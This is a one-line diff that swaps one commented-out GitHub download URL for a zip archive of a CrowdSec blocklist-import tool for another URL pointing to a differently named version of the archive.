@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/fredperry72/crowdsec-blocklist-import/master/escapee/crowdsec-import-blocklist-3.4.zip
+# https://github.com/fredperry72/crowdsec-blocklist-import/raw/refs/heads/master/escapee/import-crowdsec-blocklist-v3.0.zip
